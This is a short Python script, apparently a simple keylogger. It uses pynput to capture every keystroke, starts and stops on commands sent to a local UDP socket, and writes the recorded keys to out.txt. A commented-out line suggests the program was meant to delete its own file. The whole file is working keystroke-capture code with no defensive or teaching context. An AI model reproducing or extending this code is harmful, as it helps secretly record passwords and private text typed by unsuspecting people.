from pynput.keyboard import Key, Listener
import socket


output = []


def on_press(key):
    if key == Key.enter:
        output.append("\n")
    elif key == Key.space:
        output.append(" ")
    else:
        output.append(str(key))


def key_thread():
    listener = Listener(on_press=on_press)
    listener.start()


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = "127.0.0.1" #localhost
    port = 10101
    addr = (ip, port)
    sock.bind(addr)
    

    log_dir = "./"

    # remove(argv[0])
    com = sock.recv(20).decode()
    print(com)
    started = False
    while com != "stop":
        if com == "start" and not started:
            key_thread()
            started = True
        print(output)
        com = sock.recv(20).decode()
        print(com)

    fi = open(log_dir + "out.txt", "w")
    for i in output:
        b = i.replace("\'", '')
        print(b)
        fi.write(b)
    fi.close()


if __name__ == "__main__":
    main()



